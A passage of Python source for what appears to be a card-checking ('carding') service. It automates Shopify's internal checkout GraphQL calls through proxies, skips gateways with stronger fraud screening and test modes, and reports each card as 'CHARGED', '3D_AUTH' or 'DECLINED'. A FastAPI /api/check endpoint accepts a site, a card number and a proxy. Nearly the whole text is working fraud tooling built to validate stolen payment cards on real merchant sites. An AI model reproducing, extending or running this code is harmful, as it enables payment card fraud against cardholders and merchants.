                            "amount": tax_amount,
                            "currencyCode": tax_currency,
                        }
                    },
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": exemptions if exemptions else [],
                }

            elif tax_structure in ["combined", "standard", "proposed_standard"]:
                taxes_config = {
                    "proposedAllocations": allocations if allocations else None,
                    "proposedTotalAmount": {
                        "value": {
                            "amount": tax_amount,
                            "currencyCode": tax_currency,
                        }
                    },
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": exemptions if exemptions else [],
                }

            else:
                taxes_config = {
                    "proposedAllocations": None,
                    "proposedTotalAmount": None,
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                }
                
            signed_handles = []
            try:
                delivery_expectations = seller_proposal.get("deliveryExpectations", {})
                expectation_lines = delivery_expectations.get("deliveryExpectationLines", [])
                for line in expectation_lines:
                    sh = line.get("signedHandle")                    
                    if sh:
                        signed_handles.append({"signedHandle": sh})
            except:
                pass
                        
            try:
                payment = seller_proposal.get("payment") or {}
                available_payment_lines = payment.get("availablePaymentLines") or []

                valid_payment_method = None
                fallback_payment_method = None 

                SKIP_TYPENAMES = {
                    "anygiftcardpaymentmethod",
                    "anystripesharedtokenpaymentmethod",
                    "walletpaymentmethod",
                    "walletsplatformconfiguration",
                    "paypalwalletconfig",
                    "applepaywalletconfig",
                    "googlepaywalletconfig",
                    "venmowalletconfig",
                }

                BLOCKED_KEYS = {
                    "stripe", "onerway", "authorize", "tap payments", "e-way",
                    "eway", "onesite", "onsite", "payoneer", "pingpong",
                    "moneris", "braintree", "airwallex", "apple", "google",
                    "clover", "oceanpayment", "cybersource", "safeweb", "adyen",
                    "test", "sandbox", "bogus", "worldpay", "b&n", "credit or debit", "bankful",                    
                }

                def normalize(text):
                    return (text or "").lower().replace("_", " ").strip()

                for line in available_payment_lines:
                    method = line.get("paymentMethod") or {}

                    typename = normalize(method.get("__typename"))
                    if typename in SKIP_TYPENAMES:
                        continue

                    if method.get("__typename") != "PaymentProvider" and typename not in SKIP_TYPENAMES:
                        if "paymentprovider" not in typename:
                            continue

                    identifier = method.get("paymentMethodIdentifier")
                    if not identifier:
                        continue

                    name = method.get("extensibilityDisplayName") or method.get("name") or ""
                    combined = normalize(f"{name} {identifier}")

                    if "installment" in combined:
                        continue

                    if any(block in combined for block in BLOCKED_KEYS):
                        continue

                    if "shopify" in combined or "shop pay" in combined:
                        valid_payment_method = method
                        break 
                    
                    if not fallback_payment_method:
                        fallback_payment_method = method

                if not valid_payment_method:
                    valid_payment_method = fallback_payment_method

                if not valid_payment_method:
                    return {
                        "status": "ERROR",
                        "message": "No valid gateway found (All Blocked)",
                        "time": time.time() - start_time,
                        "amount": final_amount,
                        "currency": currency_code if "currency_code" in locals() else "USD",
                        "gateway": "Normal"
                    }

                payment_method_identifier = valid_payment_method.get("paymentMethodIdentifier")

                if not payment_method_identifier:
                    return {
                        "status": "ERROR",
                        "message": "Payment id empty",
                        "time": time.time() - start_time,
                        "amount": final_amount,
                        "currency": currency_code if "currency_code" in locals() else "USD",
                        "gateway": "Normal"
                    }

                gateway_name = (
                    valid_payment_method.get("extensibilityDisplayName")
                    or valid_payment_method.get("name")
                    or payment_method_identifier
                    or "Normal"
                )

                gateway = gateway_name.strip()

            except Exception as e:
                return {
                    "status": "ERROR",
                    "message": f"Payment parsing error: {type(e).__name__} - {str(e)[:100]}",
                    "time": time.time() - start_time,
                    "amount": final_amount,
                    "currency": currency_code if "currency_code" in locals() else "USD",
                    "gateway": gateway if "gateway" in locals() else "Normal"
                }

        else:

            return {
                "status": "ERROR",
                "message": "No seller proposal available",
                "time": time.time() - start_time,
                "amount": final_amount if "final_amount" in locals() else "0",
                "currency": currency_code if "currency_code" in locals() else "USD",
                "gateway": gateway if "gateway" in locals() else "Normal"
            }

        critical_data = {
            "Queue Token": bool(new_queue_token),
            "Merch Amount": bool(merch_amount),
            "Final Amount": bool(final_amount),
            "Payment Method ID": bool(payment_method_identifier),
        }

        if is_shippable:
            critical_data["Seller Handle"] = bool(seller_handle)

        missing_data = [key for key, exists in critical_data.items() if not exists]

        if missing_data:
            if "Seller Handle" in missing_data and is_shippable:
                return {
                    "status": "ERROR",
                    "message": "Handle Id Is Empty",
                    "time": time.time() - start_time,
                    "amount": final_amount,
                    "currency": currency_code if "currency_code" in locals() else "USD",
                    "gateway": gateway,
                }




        random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
        url = f"{checkout_base_domain}/checkouts/internal/graphql/persisted"
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': store_url,            
            'referer': checkout_url,
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{serialized_source_token}", type="{serialized_source_type}"',
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build_id,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': serialized_source_token,
            "user-agent": ua,
            
        }


        params = {
            'operationName': 'SubmitForCompletion',
        }

        json_data = {
            "variables": {
                "input": {
                    "sessionInput": {
                        "sessionToken": x_checkout_one_session_token,
                    },
                    "queueToken": new_queue_token,
                    "discounts": {
                        "lines": [],
                        "acceptUnexpectedDiscounts": True,
                    },
                    "delivery": build_submit_delivery_terms(
                        is_shippable=is_shippable,
                        address=address,
                        stable_id=stable_id,
                        shipping_amount=shipping_amount,
                        currency_code=currency_code,
                        seller_handle=seller_handle or "",
                    ),
                   "deliveryExpectations": {
                       "deliveryExpectationLines": signed_handles   # signed_handles already list of dicts
                   },
                    "merchandise": {
                        "merchandiseLines": [
                            {
                                "stableId": stable_id,
                                "merchandise": {
                                    "productVariantReference": {
                                        "id": merch_id,
                                        "variantId": variant_id,
                                        "properties": [],
                                        "sellingPlanId": None,
                                        "sellingPlanDigest": None,
                                    },
                                },
                                "quantity": {
                                    "items": {
                                        "value": 1,
                                    },
                                },
                                "expectedTotalPrice": {
                                    "value": {
                                        "amount": merch_amount,
                                        "currencyCode": currency_code,
                                    },
                                },
                                "lineComponentsSource": None,
                                "lineComponents": [],
                            },
                        ],
                    },
                    "memberships": {
                        "memberships": [],
                    },
                    "payment": {
                        "totalAmount": {
                            "any": True,
                        },
                        "paymentLines": [
                            {
                                "paymentMethod": {
                                    "directPaymentMethod": {
                                        "paymentMethodIdentifier": payment_method_identifier,
                                        "sessionId": sessionid,
                                        "billingAddress": {
                                            "streetAddress": {
                                                "address1": address["street"],
                                                "address2": address["street"],
                                                "city": address["city"],
                                                "countryCode": address["country"],
                                                "postalCode": address[
                                                    "postal_code"
                                                ],
                                                "firstName": address["first_name"],
                                                "lastName": address["last_name"],
                                                "zoneCode": address["zoneCode"],
                                                "phone": address["phone"],
                                            },
                                        },
                                        "cardSource": None,
                                    },
                                    "giftCardPaymentMethod": None,
                                    "redeemablePaymentMethod": None,
                                    "walletPaymentMethod": None,
                                    "walletsPlatformPaymentMethod": None,
                                    "localPaymentMethod": None,
                                    "paymentOnDeliveryMethod": None,
                                    "paymentOnDeliveryMethod2": None,
                                    "manualPaymentMethod": None,
                                    "customPaymentMethod": None,
                                    "offsitePaymentMethod": None,
                                    "customOnsitePaymentMethod": None,
                                    "deferredPaymentMethod": None,
                                    "customerCreditCardPaymentMethod": None,
                                    "paypalBillingAgreementPaymentMethod": None,
                                    "remotePaymentInstrument": None,
                                },
                                "amount": {
                                    "value": {
                                        "amount": final_amount,
                                        "currencyCode": currency_code,
                                    },
                                },
                            },
                        ],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": address["street"],
                                "address2": address["street"],
                                "city": address["city"],
                                "countryCode": address["country"],
                                "postalCode": address["postal_code"],
                                "firstName": address["first_name"],
                                "lastName": address["last_name"],
                                "zoneCode": address["zoneCode"],
                                "phone": address["phone"],
                            },
                        },
                        "creditCardBin": credit_card_bin
                    },
                    "buyerIdentity": {
                        "customer": {
                            "presentmentCurrency": currency_code,
                            "countryCode": address["country"],
                        },
                        "email": address["email"],
                        "emailChanged": False,
                        "phoneCountryCode": address["country"],
                        "marketingConsent": [
                            {
                                "email": {
                                    "consentState": "DECLINED",
                                    "value": address["email"]
                                }
                            }
                        ],
                        "shopPayOptInPhone": {
                            "number": address["phone"],
                            "countryCode": address["country"],
                        },
                        "rememberMe": False,
                    },
                    "tip": {
                        "tipLines": [],
                    },
                    "taxes": taxes_config,
                    "note": {
                        "message": None,
                        "customAttributes": [],
                    },
                    "localizationExtension": {
                        "fields": [],
                    },
                    "shopPayArtifact": {
                        "optIn": {
                            "vaultEmail": "",
                            "vaultPhone": address["phone"],
                            "optInSource": "REMEMBER_ME"
                        }
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {
                        "buyerRefusesDuties": False,
                    },
                    "cartMetafields": [],
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {
                    "requestUrl": checkout_url,
                    'pageId': random_page_id,
                },
            },
            "operationName": "SubmitForCompletion",
            'id': submit_id,
        }
        
        def extract_error(err):
            if isinstance(err, dict):
                if isinstance(err.get("message"), dict):
                    return extract_error(err["message"])
                if err.get("localizedMessage") and isinstance(err["localizedMessage"], str):
                    return err["localizedMessage"]
                if err.get("message") and isinstance(err["message"], str):
                    return err["message"]
                if err.get("code"):
                    return str(err["code"])
                return "Unknown Error"
            elif isinstance(err, str):
                return err
            else:
                return str(err)

        Max_retries = 3
        receipt_id = None
        submit_response_text = ""
        submit_data = {}
        submit_result = {}                       
        
        for attempt in range(Max_retries):
            try:
                async with session.post(
                    url,
                    headers=headers,
                    params=params,
                    json=json_data,    
                    proxy=proxy_url,                
                    timeout=timeout_settings
                ) as response:
                
                    if response.status in [403, 429]:
                        return {
                            "status": "ERROR",
                            "message": str(response.status),
                            "time": time.time() - start_time,
                            "amount": final_amount if "final_amount" in locals() else "0",
                            "currency": currency_code if "currency_code" in locals() else "USD",
                            "gateway": gateway if "gateway" in locals() else "UNKNOWN",
                        }
                    elif response.status in [500, 502, 503, 504]:
                        if attempt < Max_retries - 1:
                            continue
                        else:
                            return {
                                "status": "ERROR",
                                "message": str(response.status),
                                "time": time.time() - start_time,
                                "amount": final_amount if "final_amount" in locals() else "0",
                                "currency": currency_code if "currency_code" in locals() else "USD",
                                "gateway": gateway if "gateway" in locals() else "UNKNOWN",
                            }
            
                    submit_response_text = await response.text()
        
            except Exception as e:
                if attempt < Max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                else:
                    return {
                        "status": "ERROR",
                        "message": str(e),
                        "time": time.time() - start_time,
                        "amount": final_amount if "final_amount" in locals() else "0",
                        "currency": currency_code if "currency_code" in locals() else "USD",
                        "gateway": gateway if "gateway" in locals() else "UNKNOWN",
                    }
        
            try:
                if submit_response_text.strip():
                    submit_data = json.loads(submit_response_text)
            except Exception:
                submit_data = {}
        
            data_section = submit_data.get("data") or {}
            submit_result = data_section.get("submitForCompletion") or {}
            receipt = submit_result.get("receipt") or {}
            receipt_id = receipt.get("id")
        
            if receipt_id:
                break
        
            errors_found = []
            completion_errors = submit_result.get("errors") or []
            top_errors = submit_data.get("errors") or []
        
            for err in completion_errors + top_errors:
                extracted = extract_error(err)
                if extracted and extracted != "Unknown Error":
                    errors_found.append(extracted)
        
            if errors_found:
                return {
                    "status": "ERROR",
                    "message": errors_found[0],
                    "time": time.time() - start_time,

                    "amount": final_amount if "final_amount" in locals() else "0",
                    "currency": currency_code if "currency_code" in locals() else "USD",
                    "gateway": gateway if "gateway" in locals() else "UNKNOWN",
                }
        
        if not receipt_id:

            return {
                "status": "ERROR",
                "message": "MAX_RETRIES_EXCEEDED",
                "time": time.time() - start_time,
                "amount": final_amount if "final_amount" in locals() else "0",
                "currency": currency_code if "currency_code" in locals() else "USD",
                "gateway": gateway if "gateway" in locals() else "UNKNOWN",
            }
        
        poll_delay_ms = submit_result.get("pollDelay")
        if poll_delay_ms is not None:
            try:
                poll_delay = min(int(poll_delay_ms) / 1000.0, 5.0)
                await asyncio.sleep(poll_delay)
            except (ValueError, TypeError):
                await asyncio.sleep(1.0)
        else:
            await asyncio.sleep(1.0)
            
            
        params = {
            'operationName': 'PollForReceipt',
        }
        
        json_data = {
            'variables': {
                'receiptId': receipt_id,
                'sessionToken': x_checkout_one_session_token,
            },
             'operationName': 'PollForReceipt',
             'id': poll_id,  # upar se extract karo
        }

        poll_url = f"{checkout_base_domain}/checkouts/internal/graphql/persisted"
        
        for poll_attempt in range(15):
            try:
                if poll_attempt > 0:
                    await asyncio.sleep(0.5)                    
                
                async with session.post(
                    poll_url,
                    headers=headers,                             
                    params=params,   
                    json=json_data,   
                    proxy=proxy_url,                                                    
                    timeout=timeout_settings
                ) as poll_response:

                    if poll_response.status in [403, 429]:
                        return {
                            "status": "ERROR",
                            "message": str(poll_response.status),
                            "time": time.time() - start_time,
                            "amount": final_amount if "final_amount" in locals() else "0",
                            "currency": currency_code if "currency_code" in locals() else "USD",
                            "gateway": gateway if "gateway" in locals() else "Normal"
                        }
                    elif poll_response.status in [500, 502, 503, 504]:
                        if poll_attempt < 14:
                            continue
                        else:
                            return {
                                "status": "ERROR",
                                "message": str(poll_response.status),
                                "time": time.time() - start_time,
                                "amount": final_amount if "final_amount" in locals() else "0",
                                "currency": currency_code if "currency_code" in locals() else "USD",
                                "gateway": gateway if "gateway" in locals() else "Normal"
                            }

                    if poll_response.status != 200:
                        continue

                    final_text = await poll_response.text()                    
                    
                    if not final_text.strip():
                        continue

                    final_text_lower = final_text.lower()

                    if '"processedreceipt"' in final_text_lower:
                        elapsed = time.time() - start_time
                        return {
                            "status": "CHARGED 💎",
                            "message": f"Thank You ! {final_amount} {currency_code}",
                            "time": elapsed,
                            "amount": final_amount,
                            "currency": currency_code,
                            "gateway": gateway,
                        }

                    elif '"actionrequiredreceipt"' in final_text_lower:
                        elapsed = time.time() - start_time
                        return {
                            "status": "3D_AUTH",
                            "message": "3D CC",
                            "time": elapsed,
                            "amount": final_amount,
                            "currency": currency_code,
                            "gateway": gateway,
                        }

                    elif (
                        '"failedreceipt"' in final_text_lower
                        or '"paymentfailed"' in final_text_lower
                        or '"FailedReceipt"' in final_text
                        or '"processingError"' in final_text
                    ):
                        elapsed = time.time() - start_time
                        error_code = "GENERIC_DECLINE"

                        if '"code":"' in final_text:
                            start = final_text.find('"code":"') + 8
                            end = final_text.find('"', start)
                            error_code = final_text[start:end] or "GENERIC_DECLINE"


                        return {
                            "status": "DECLINED",
                            "message": error_code,
                            "time": elapsed,
                            "amount": final_amount,
                            "currency": currency_code,
                            "gateway": gateway,
                        }

                    elif '"processingreceipt"' in final_text_lower:
                        continue

                    else:
                        continue

            except Exception as e:
                if poll_attempt < 14:
                    continue
                else:
                    return {
                        "status": "ERROR",
                        "message": str(e),
                        "time": time.time() - start_time,
                        "amount": final_amount if "final_amount" in locals() else "0",
                        "currency": currency_code if "currency_code" in locals() else "USD",
                        "gateway": gateway if "gateway" in locals() else "Normal"
                    }
        else:
            elapsed = time.time() - start_time

            return {
                "status": "ERROR",
                "message": "TIMEOUT_AFTER_RETRIES",
                "time": elapsed,
                "amount": final_amount if "final_amount" in locals() else "0",
                "currency": currency_code if "currency_code" in locals() else "USD",
                "gateway": gateway if "gateway" in locals() else "Normal"
            }
            
    except Exception as e:
        return {
            "status": "ERROR",
            "message": str(e),
            "time": time.time() - start_time,
            "amount": "0",
            "currency": "USD",
            "gateway": "Normal"
        }






global_connector = None

@asynccontextmanager
async def lifespan(app: FastAPI):
    global global_connector
    global_connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        enable_cleanup_closed=True,
        ttl_dns_cache=300,
        keepalive_timeout=20,
        ssl=False                       # <--- YEH DAALEIN
    )
    yield
    if global_connector:
        await global_connector.close()

app = FastAPI(lifespan=lifespan)

@app.get("/api/check")
async def check_card_api(
    site: str = Query(...),
    card: str = Query(...),
    proxy: str = Query(..., min_length=1)   
):
    # ✅ BEST BACKEND TIMEOUT (Bot ke 70s ke hisaab se)
    timeout = aiohttp.ClientTimeout(
        total=80,           # Badha kar 80 kar diya
        sock_connect=15,    # Connect hone ke liye 15s
        sock_read=65        # Gateway se data aane ke liye 65s (60s proxies easily pass hongi)
    )

    
    async with aiohttp.ClientSession(
        connector=global_connector,
        connector_owner=False, 
        timeout=timeout
    ) as session:
        result = await shopify_payment_worker(session, site, card, proxy)
        return result
